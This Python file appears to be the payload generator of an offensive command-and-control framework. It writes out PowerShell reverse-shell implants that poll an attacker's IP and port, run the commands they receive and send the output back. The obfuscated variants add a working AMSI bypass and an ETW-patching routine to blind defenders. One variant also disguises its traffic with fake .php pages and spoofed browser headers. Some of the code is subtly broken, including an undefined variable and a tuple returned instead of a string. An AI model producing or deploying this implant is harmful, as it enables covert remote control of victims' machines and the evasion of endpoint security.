import base64
from core.payload_generator.common import payload_utils as payutils
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

def make_raw(ip, port, beacon_interval):
	beacon_url = f"http://{ip}:{port}/"
	interval = beacon_interval

	raw = (
		f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
		f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
		f"$sid=G-SID;$uri='{beacon_url}';"
		"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
		"$hdr=@{'X-Session-ID'=$sid};"

		# Define Get-Task
		"Function Get-Task {"
		"$req = [System.Net.HttpWebRequest]::Create($uri);"
		"$req.Method = 'GET';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		"$resp = $req.GetResponse();"
		"$stream = $resp.GetResponseStream();"
		"$reader = New-Object System.IO.StreamReader($stream);"
		"$result = $reader.ReadToEnd();"
		"$reader.Close();$stream.Close();$resp.Close();"
		"return $result"
		"};"

		# Define Send-Output
		"Function Send-Output($payload) {"
		"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
		"$req = [System.Net.HttpWebRequest]::Create($uri);"
		"$req.Method = 'POST';"
		"$req.ContentType = 'application/json';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		"$req.ContentLength = $bytes.Length;"
		"$stream = $req.GetRequestStream();"
		"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
		"$resp = $req.GetResponse();$resp.Close()"
		"};"

		# Init PS pipeline
		"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
		"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
		"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

		# Beacon loop
		"while($true){"
		"try{"
		"$taskJson = Get-Task;"
		"$task = ConvertFrom-Json $taskJson;"
		"if($task.cmd){"
		"$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.cmd));"
		"$pipeline.Commands.Clear();"
		"$pipeline.AddScript($cmd)|Out-Null;"
		"$results = $pipeline.Invoke();"
		"$output = $results|Out-String;"
		"$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
		"$body = @{output=$b64}|ConvertTo-Json;"
		"Send-Output $body;"
		"}"
		"}catch{};"
		f"Start-Sleep -Seconds {interval};"
		"}"
	)

	return raw



def generate_windows_powershell_http(ip, port, obs, beacon_interval, no_child=None):

	if obs is None or obs == 0:
		payload = make_raw(ip, port, beacon_interval)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	if obs == 1:
		payload = generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	elif obs == 2:
		payload = generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd
		
	"""else:
		return _obfuscate_level3(template)"""

def generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval):
	beacon_url = f"http://{ip}:{port}/"
	interval = beacon_interval

	one_liner = (
	f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
	f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
	f"$sid=G-SID;$uri='{beacon_url}';"
	f"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
	f"$hdr=@{{'X-Session-ID'=$sid}};"

	# AMSI bypass
	"$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
	"(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
	"$n='Non'+'Public';$s='Static';"
	"$f=$e.GetField(([string]::Join('',[char[]]"
	"(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
	"$t=[type[]]@([object],[bool]);"
	"$m=$f.GetType().GetMethod('Set'+'Value',$t);"
	"$m.Invoke($f,@($null,$true));"

	# ETW bypass
	"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
	"[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
	"[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
	"[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
	"$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
	"$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
	"$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
	"$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
	"$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
	"$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
	"$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
	"$etblOff=$ntbase.ToInt64()+$pe+0x88;"
	"$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
	"$exptVA=$ntbase.ToInt64()+$expt;"
	"$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
	"$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
	"$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
	"$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
	"$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
	"$namePtr=($ntbase.ToInt64()+$nameRVA);"
	"$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};"
	"if($currName-eq$e){$etwptr=$namePtr;break}};"
	"$etwAddr=[IntPtr]$etwptr;"
	"$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
	"[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

	# Define GET using .NET
	"Function Get-Task {"
	"$req = [System.Net.HttpWebRequest]::Create($uri);"
	"$req.Method = 'GET';"
	"$req.Headers.Add('X-Session-ID',$sid);"
	"$resp = $req.GetResponse();"
	"$stream = $resp.GetResponseStream();"
	"$reader = New-Object System.IO.StreamReader($stream);"
	"$result = $reader.ReadToEnd();"
	"$reader.Close();$stream.Close();$resp.Close();"
	"return $result"
	"}"

	# Define POST using .NET
	"Function Send-Output($payload) {"
	"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
	"$req = [System.Net.HttpWebRequest]::Create($uri);"
	"$req.Method = 'POST';"
	"$req.ContentType = 'application/json';"
	"$req.Headers.Add('X-Session-ID',$sid);"
	"$req.ContentLength = $bytes.Length;"
	"$stream = $req.GetRequestStream();"
	"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
	"$resp = $req.GetResponse();$resp.Close()"
	"}"

	# PowerShell pipeline init
	"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
	"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
	"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

	# Beacon loop
	f"while($true){{"
	"try{"
	"    $taskJson = Get-Task;"
	"    $task = ConvertFrom-Json $taskJson;"
	"    if($task.cmd){"
	"        $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.cmd));"
	"        $pipeline.Commands.Clear();"
	"        $pipeline.AddScript($cmd)|Out-Null;"
	"        $results = $pipeline.Invoke();"
	"        $output = $results|Out-String;"
	"        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
	"        $body = @{output=$b64}|ConvertTo-Json;"
	"        Send-Output $body;"
	"    };"
	"}"
	"catch{};"
	f"Start-Sleep -Seconds {interval};"
	"}"
)

	return one_liner

def generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval):
	"""
	HTTP-based Windows reverse shell, with randomized PHP endpoints,
	fake browser headers, obfuscated C2 header keys and System.Text.Json parsing.
	"""
	# list of fake .php pages
	pages = ["admin.php","upload.php","maintainence.php","background.php","painters.php", "backup.php"]
	# obfuscated header keys
	hdrs = {"X-Session-ID": [88,45,83,101,115,115,105,111,110,45,73,68], "X-API-KEY": [88,45,65,80,73,45,75,69,89], "X-Forward-Key": [88,45,70,111,114,119,97,114,100,45,75,101,121]}

	hdr_keys = ["X-Session-ID", "X-API-KEY", "X-Forward-Key"]
	pages_literal = ", ".join(f"'{p}'" for p in pages)
	hdr_keys_literal  = ", ".join(f"'{h}'" for h in hdr_keys)
 

	# build the raw PowerShell one-liner
	ps_lines = (
	"Function G-SID {",
	"    $c = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();",
	"    $p = @();",
	"    1..3 | % { $p += -join(1..5 | % { $c | Get-Random }) };",
	"    $p -join '-'",
	"}",
	"$sid = G-SID;",
	"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();",

	# AMSI bypass
	"$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
	"(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
	"$n='Non'+'Public';$s='Static';"
	"$f=$e.GetField(([string]::Join('',[char[]]"
	"(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
	"$t=[type[]]@([object],[bool]);"
	"$m=$f.GetType().GetMethod('Set'+'Value',$t);"
	"$m.Invoke($f,@($null,$true));"

	# ETW bypass
	"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
	"[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
	"[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
	"[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
	"$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
	"$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
	"$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
	"$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
	"$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
	"$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
	"$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
	"$etblOff=$ntbase.ToInt64()+$pe+0x88;"
	"$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
	"$exptVA=$ntbase.ToInt64()+$expt;"
	"$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
	"$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
	"$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
	"$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
	"$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
	"$namePtr=($ntbase.ToInt64()+$nameRVA);"
	"$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};"
	"if($currName-eq$e){$etwptr=$namePtr;break}};"
	"$etwAddr=[IntPtr]$etwptr;"
	"$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
	"[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

	f"$pages = @({pages_literal});",
	f"$hdrArr = @({hdr_keys_literal});",

	"while ($true) {",
	"    $page   = $pages | Get-Random;",
	"    $hdrKey = $hdrArr | Get-Random;",
	f"    $uri    = 'http://{ip}:{port}/' + $page;",
	"$req  = [System.Net.HttpWebRequest]::Create($uri);",
	"    $req.Method    = 'GET';",
	"    $req.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';",
	"    $req.Accept    = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';",
	"    $req.Headers.Add('Accept-Language','en-US,en;q=0.5');",
	"    $req.Headers.Add('Accept-Encoding','gzip, deflate');",
	"    $req.Headers.Add($hdrKey, $sid);",
	"    $resp   = $req.GetResponse();",
	"    $stream = $resp.GetResponseStream();",
	"    $reader = New-Object System.IO.StreamReader($stream);",
	"    $taskJson = $reader.ReadToEnd();",
	"    $reader.Close(); $stream.Close(); $resp.Close();",

	# ← replaced reflection with built-ins:
	"    $task    = $taskJson | ConvertFrom-Json;",
	"    $cmdB64  = $task.cmd;",

	"    $cmd     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmdB64));",
	"    $pw      = [Management.Automation.PowerShell]::Create();",
	"    $pw.AddScript($cmd) | Out-Null;",
	"    $res     = $pw.Invoke() | Out-String;",
	"    $b64out  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($res.Trim()));",

	"$req2  = [System.Net.HttpWebRequest]::Create($uri);",
	"    $req2.Method    = 'POST';",
	"    $req2.ContentType   = 'application/json';",
	"    $req2.UserAgent     = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';",
	"    $req2.Headers.Add('Accept-Language','en-US,en;q=0.5');",
	"    $req2.Headers.Add('Accept-Encoding','gzip, deflate');",
	"    $hdrKey2 = $hdrArr | Get-Random;",
	"    $req2.Headers.Add($hdrKey2, $sid);",

	"    $bodyDict = @{ output = $b64out };",
	"    $bodyJson = $bodyDict | ConvertTo-Json -Compress;",

	"    $buf     = [Text.Encoding]::UTF8.GetBytes($bodyJson);",
	"    $req2.ContentLength = $buf.Length;",
	"    $stream2 = $req2.GetRequestStream(); $stream2.Write($buf,0,$buf.Length); $stream2.Close();",
	"    $resp2   = $req2.GetResponse(); $resp2.Close();",

	f"    Start-Sleep -Seconds {beacon_interval};",
	"}",
)
	
	return ps_lines